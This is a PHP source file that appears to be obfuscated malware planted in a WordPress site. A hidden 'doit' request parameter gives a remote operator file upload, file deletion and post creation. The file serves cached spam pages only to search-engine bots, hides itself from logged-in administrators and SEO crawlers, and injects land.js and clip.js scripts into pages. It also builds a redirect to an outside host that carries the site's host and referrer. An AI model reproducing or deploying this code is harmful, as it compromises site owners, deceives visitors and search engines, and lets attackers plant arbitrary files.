<?php
error_reporting(0); if (isset($_COOKIE['engin_ssl_'])) { return true; } if (checkers()) { @header('HTTP/1.0 404 Not Found'); die; } $sp7813f5 = str_replace('www.', '', strtolower(@$_SERVER['HTTP_HOST'])); $spf71fb5 = @$_SERVER['HTTP_USER_AGENT']; $sp179357 = @isset($_SERVER['HTTP_REFERER']) ? @$_SERVER['HTTP_REFERER'] : 'BLANK'; if (isset($_REQUEST['doit']) and substr(md5($_REQUEST['doit']), 0, 6) == '4f37f6') { $spafa6f5 = array(); if (isset($_REQUEST['vars'])) { preg_match('/www/', $_SERVER['HTTP_HOST']) ? $spafa6f5['www'] = 1 : ($spafa6f5['www'] = 0); ini_get('allow_url_fopen') ? $spafa6f5['allow_url_fopen'] = 1 : ($spafa6f5['allow_url_fopen'] = 0); $spfbe2f4 = array('curl_exec', 'file_get_contents', 'gzdecode', 'move_uploaded_file', 'stream_get_contents', 'base64_encode'); foreach ($spfbe2f4 as $sp400839) { function_exists($sp400839) ? $spafa6f5[$sp400839] = 1 : ($spafa6f5[$sp400839] = 0); } echo '~~~' . serialize($spafa6f5) . '~~~xzysucceesxty'; die; } if ($sp4eb2fe = wpath()) { if (is_file($sp4eb2fe . 'wp-load.php')) { require_once $sp4eb2fe . 'wp-load.php'; } } else { echo 'xyzerorwpathxyz
'; return false; } if (isset($_REQUEST['permas'])) { if ($spf03948 = havelinks()) { echo $spf03948; } else { echo 'xyzcanthavelinksxyz
'; } } if (isset($_REQUEST['gmap'])) { if (!itsg_create_sitemap()) { echo 'xyzcantsitemapxyz'; } } if (isset($_REQUEST['pmap'])) { $spf45223 = get_content('https://www.google.com/webmasters/tools/ping?sitemap=http://' . $_SERVER['HTTP_HOST'] . '/sitemap.xml'); echo strpos($spf45223, 'Sitemap Notification Received') !== false ? 'zyzokxyz' : 'zyzcantxyz'; } if (isset($_REQUEST['arti']) && isset($_REQUEST['tits'])) { if ($spf03948 = doapost(urldecode($_REQUEST['tits']), urldecode($_REQUEST['arti']))) { echo $spf03948; } else { echo 'xyzcantpostxyz
'; } } if (isset($_REQUEST['delp'])) { if ($spf03948 = delapost($_REQUEST['delp'])) { echo $spf03948; } } $spa736dc = tempath($sp7813f5) ? tempath($sp7813f5) : die('xyzcantcreatetmpxyz
'); if (@$_FILES['fl']) { if (file_exists($spa736dc . $_FILES['fl']['name'])) { unlink($spa736dc . $_FILES['fl']['name']); } if (@$_FILES['fl']['error']) { die($_FILES['fl']['error']); } else { if (move_uploaded_file($_FILES['fl']['tmp_name'], $spa736dc . $_FILES['fl']['name'])) { echo $_FILES['fl']['name'] . 'xzysucceesxty'; } } } if (@$_FILES['im']) { $sp0ba2ea = image_path(); if (file_exists($sp0ba2ea . $_FILES['im']['name'])) { unlink($sp0ba2ea . $_FILES['im']['name']); } if (@$_FILES['im']['error']) { die($_FILES['im']['error']); } else { if (move_uploaded_file($_FILES['im']['tmp_name'], image_path() . $_FILES['im']['name'])) { echo '~~~/wp-content/uploads/2016/' . date('m') . '/' . $_FILES['im']['name'] . '~~~' . 'xzysucceesxty'; } } } if (@$_FILES['delfile']) { if (file_exists($spa736dc . $_REQUEST['delfile'])) { if (unlink($spa736dc . $_REQUEST['delfile'])) { echo 'xzysucceesdelxty'; } } } die; } if (!function_exists('gzdecode')) { function gzdecode($spf45223) { return gzinflate(substr($spf45223, 10, -8)); } } $spa736dc = tempath($sp7813f5); $spa5c2a4 = get_ip_address(); $sp90f5de = @$_SERVER['SERVER_NAME']; $sp03fefc = trim(@$_SERVER['REQUEST_URI'], '/'); $sp03fefc = str_replace(array('index.php/', 'index.php?', 'index.php?p=', '?', '?p='), '', $sp03fefc); $sp2eb347 = @$_SERVER['DOCUMENT_ROOT']; $spbe0ec3 = 'http://www.takemeoutofhere.com/go.php?tip=' . urlencode(base64_encode($sp7813f5 . '|' . $sp179357)); $spa7dcda = checkbot($spa5c2a4); if ($spa7dcda === false && preg_match('/admin|wp-login.php|wp-admin|administrator/i', $sp03fefc) && !preg_match('/ajax/i', $sp03fefc)) { setcookie('engin_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $sp2d1c5c); } foreach ((array) $_COOKIE as $spda900b => $sp2f223b) { if (stristr($spda900b, 'wordpress_logged_in_')) { setcookie('engin_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $sp2d1c5c); return true; } if (stristr($spda900b, 'activeProfile')) { setcookie('engin_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $sp2d1c5c); return true; } } if ($spa7dcda) { if (($sp03fefc == '' || $sp03fefc == 'index.php') && @is_file($spa736dc . md5('index'))) { echo gzdecode(file_get_contents($spa736dc . md5('index'))); die; } } if (@is_file($spa736dc . md5($sp03fefc))) { if ($sp03fefc == 'sitemap.xml') { @header('Content-type: text/xml'); } echo gzdecode(file_get_contents($spa736dc . md5($sp03fefc))); die; } if ($sp03fefc == substr(md5('shop' . $sp7813f5), 0, 6) || $sp03fefc == '?' . substr(md5('shop' . $sp7813f5), 0, 6)) { @header('HTTP/1.1 301 Moved Permanently'); @header('Location: http://' . $sp7813f5 . '/'); } function image_path() { if ($sp4eb2fe = wpath()) { if (!is_dir($sp4eb2fe . 'wp-content/uploads/2016')) { mkdir($sp4eb2fe . 'wp-content/uploads/2016', 511); } if (is_dir($sp4eb2fe . 'wp-content/uploads/2016') && !is_dir($sp4eb2fe . 'wp-content/uploads/2016/' . date('m'))) { mkdir($sp4eb2fe . 'wp-content/uploads/2016/' . date('m'), 511); } if (is_dir($sp4eb2fe . 'wp-content/uploads/2016/' . date('m'))) { return $sp4eb2fe . 'wp-content/uploads/2016/' . date('m') . '/'; } else { echo 'xyzcreateimagepathfalsexyz
'; return false; } } else { echo 'xyzcantfindwpxyz
'; return false; } } function havelinks() { $sp1f61f0 = array(); $sp93bb9a = array('post_type' => 'post', 'posts_per_page' => -1); $sp0f1081 = new WP_Query($sp93bb9a); if ($sp0f1081->have_posts()) { while ($sp0f1081->have_posts()) { $sp0f1081->the_post(); global $sp9835fb; $sp1f61f0[] = get_permalink($sp9835fb->ID); } } wp_reset_query(); if ($sp1f61f0) { return '~~~' . serialize($sp1f61f0) . '~~~'; } } function delapost($sp8ef287) { if (wp_delete_post($sp8ef287, true)) { echo 'zyz-delaposttrue-xyz
'; return true; } else { echo 'zyz-delapostfalse-xyz
'; return false; } return; } function doapost($sp020f02, $sp3bfc10) { global $spb7e855; get_currentuserinfo(); if ($sp020f02 == '' || $sp3bfc10 == '') { return false; } $sp191426 = array(); $sp191426['post_title'] = $sp020f02; $sp191426['post_content'] = $sp3bfc10; $sp191426['post_status'] = 'publish'; $sp191426['post_author'] = $spb7e855->ID; $sp4f7747 = wp_insert_post($sp191426); if ($sp4f7747 && !is_wp_error($sp4f7747)) { $spc60bc1 = $sp4f7747; $spc88803 = get_permalink($spc60bc1); echo '~~~' . serialize(array($spc60bc1, $spc88803)) . '~~~'; return true; } return false; } function addland($sp5eb8ba) { global $sp7813f5; $spa736dc = tempath($sp7813f5) ? tempath($sp7813f5) : die('xyzcantcreatetmpxyz
'); if (is_file($spa736dc . 'land.js') && is_file($spa736dc . 'clip.js')) { $sp4eb2fe = wpath(); $spce8a92 = str_replace($sp4eb2fe, '', $spa736dc); if (preg_match('<\\/head>', $sp5eb8ba)) { return str_replace('</head>', '
<script type=\'text/javascript\' src=\'/' . $spce8a92 . 'land.js\'></script>
<script type=\'text/javascript\' src=\'/' . $spce8a92 . 'clip.js\'></script>
</head>', $sp5eb8ba); } else { return str_replace('</title>', '</title>
<script type=\'text/javascript\' src=\'/' . $spce8a92 . 'land.js\'></script>
<script type=\'text/javascript\' src=\'/' . $spce8a92 . 'clip.js\'></script>', $sp5eb8ba); } } else { return $sp5eb8ba; } } function itsg_create_sitemap() { $spd5a5c6 = get_posts(array('numberposts' => -1, 'orderby' => 'modified', 'post_type' => array('post', 'page'), 'order' => 'DESC')); $sp95f05f = '<?xml version="1.0" encoding="UTF-8"?>'; $sp95f05f .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'; foreach ($spd5a5c6 as $sp9835fb) { setup_postdata($sp9835fb); $sp81670f = explode(' ', $sp9835fb->post_modified); $sp95f05f .= '<url>' . '<loc>' . get_permalink($sp9835fb->ID) . '</loc>' . '<lastmod>' . $sp81670f[0] . '</lastmod>' . '<changefreq>monthly</changefreq>' . '</url>'; } $sp95f05f .= '</urlset>'; echo $sp95f05f; return true; } function tempath($sp7813f5) { if ($sp4eb2fe = wpath()) { if (@is_dir($sp4eb2fe . 'wp-content/plugins/tmp/' . md5($sp7813f5))) { return $sp4eb2fe . 'wp-content/plugins/tmp/' . md5($sp7813f5) . '/'; } elseif (@is_dir($sp4eb2fe . 'wp-content/uploads/tmp/' . md5($sp7813f5))) { return $sp4eb2fe . 'wp-content/uploads/tmp/' . md5($sp7813f5) . '/'; } else { if (@mkdir($sp4eb2fe . 'wp-content/plugins/tmp', 511)) { if (@mkdir($sp4eb2fe . 'wp-content/plugins/tmp/' . md5($sp7813f5), 511)) { if (@is_dir($sp4eb2fe . 'wp-content/plugins/tmp/' . md5($sp7813f5))) { return $sp4eb2fe . 'wp-content/plugins/tmp/' . md5($sp7813f5) . '/'; } } } if (@mkdir($sp4eb2fe . 'wp-content/uploads/tmp', 511)) { if (@mkdir($sp4eb2fe . 'wp-content/uploads/tmp/' . md5($sp7813f5), 511)) { if (@is_dir($sp4eb2fe . 'wp-content/uploads/tmp/' . md5($sp7813f5))) { return $sp4eb2fe . 'wp-content/uploads/tmp/' . md5($sp7813f5) . '/'; } } } } } else { return false; } } function wpath() { $sp139ada = dirname(__FILE__); $spb120e9 = explode('/', $sp139ada); $spb120e9 = array_filter($spb120e9); while (count($spb120e9) - 1) { $sp192d08 = '/' . implode('/', $spb120e9); if (is_file($sp192d08 . '/' . 'wp-load.php')) { return $sp192d08 . '/'; } array_pop($spb120e9); } return false; } function checkip($sp528a66) { global $spa736dc; if (!file_exists($spa736dc . 'ip.txt') or time() - filemtime($spa736dc . 'ip.txt') >= '100000') { $sp4a9460 = ini_get('allow_url_fopen') == 1 ? @file_get_contents('http://ru.myip.ms/files/bots/live_webcrawlers.txt') : @get_content('http://ru.myip.ms/files/bots/live_webcrawlers.txt'); if (!$sp4a9460) { return false; } $spa1718f = explode('#', $sp4a9460); for ($spc8a9d7 = 0; $spc8a9d7 < count($spa1718f); $spc8a9d7++) { if (strlen($spa1718f[$spc8a9d7]) > 10) { if (stristr($spa1718f[$spc8a9d7], 'google')) { $sp5e26c9 = explode('
', $spa1718f[$spc8a9d7]); for ($spc79852 = 0; $spc79852 < count($sp5e26c9); $spc79852++) { if (preg_match('/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\z/', $sp5e26c9[$spc79852])) { $sp626034[] = $sp5e26c9[$spc79852]; } } } } } $sp626034 = array_unique($sp626034); $sp14955e = implode(PHP_EOL, $sp626034); $spbaf579 = fopen($spa736dc . '/ip.txt', 'w+'); fwrite($spbaf579, $sp14955e); fclose($spbaf579); } else { $sp14955e = file_get_contents($spa736dc . '/ip.txt'); } $sp14955e = explode('
', $sp14955e); if (empty($sp14955e)) { return false; } return in_array($sp528a66, $sp14955e) ? true : false; } function get_content($sp644d8d) { if (function_exists('curl_exec')) { $spa939f8 = curl_init($sp644d8d); curl_setopt($spa939f8, CURLOPT_SSL_VERIFYPEER, true); curl_setopt($spa939f8, CURLOPT_FRESH_CONNECT, true); curl_setopt($spa939f8, CURLOPT_RETURNTRANSFER, 1); curl_setopt($spa939f8, CURLOPT_CONNECTTIMEOUT, 6); curl_setopt($spa939f8, CURLOPT_TIMEOUT, 5); curl_setopt($spa939f8, CURLOPT_FOLLOWLOCATION, true); curl_setopt($spa939f8, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'); $spd644dc = curl_exec($spa939f8); curl_close($spa939f8); } elseif (function_exists('file_get_contents') && ini_get('allow_url_fopen')) { $spd644dc = file_get_contents($sp644d8d); } elseif (function_exists('fopen') && function_exists('stream_get_contents')) { $sp8be09d = fopen($sp644d8d, 'r'); $spd644dc = stream_get_contents($sp8be09d); } else { $spd644dc = false; } return $spd644dc; } function checkers() { global $spf71fb5; if (preg_match('/rogerbo|exabot|mj12bot|dotbot|gigabot|ahrefsbot|sitebot|semrushbot|ia_archiver|searchmetricsbot|seokicks-robot|sistrix|lipperhey spider|ncbot|backlinkcrawler|archive.org_bot|meanpathbot|pagesinventory|aboundexbot|spbot|linkdexbot|nutch|blexbot|ezooms|scoutjet|majestic|dsearch|blekkobo/i', $spf71fb5)) { return true; } } function checkbot($spa5c2a4) { if (frm_isbot()) { return true; } $spd25712 = strtolower(@gethostbyaddr($spa5c2a4)); if (preg_match('/google|bing|aol|yahoo|yandex|msn|baidu|facebook/i', $spd25712)) { return true; } if (checkip($spa5c2a4)) { return true; } return false; } function frm_isbot() { $spe2dafd = @strtolower($_SERVER['HTTP_USER_AGENT']); if (($sp042298 = ip2long(get_ip_address())) < 0) { $sp042298 += 4294967296; } $sp171f55 = array(array(3639549953, 3639558142), array(1089052673, 1089060862), array(1123635201, 1123639294), array(1208926209, 1208942590), array(3512041473, 3512074238), array(1113980929, 1113985022), array(1249705985, 1249771518), array(1074921473, 1074925566), array(3481178113, 3481182206), array(2915172353, 2915237886), array(3627728897, 3627737086), array(1823541249, 1823543294)); foreach ($sp171f55 as $sp1b9ed4) { if ($sp042298 >= $sp1b9ed4[0] && $sp042298 <= $sp1b9ed4[1]) { return true; } } if (!$spe2dafd) { return true; } $sp07afeb = array('googlebot', 'bingbot', 'slurp', 'msnbot', 'jeeves', 'teoma', 'crawler', 'spider'); foreach ($sp07afeb as $sp54686e) { if (strpos($spe2dafd, $sp54686e) !== false) { return true; } } return false; } function get_ip_address() { foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $spac93d8) { if (array_key_exists($spac93d8, $_SERVER) === true) { foreach (explode(',', $_SERVER[$spac93d8]) as $sp528a66) { $sp528a66 = trim($sp528a66); if (filter_var($sp528a66, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) { return $sp528a66; } } } } }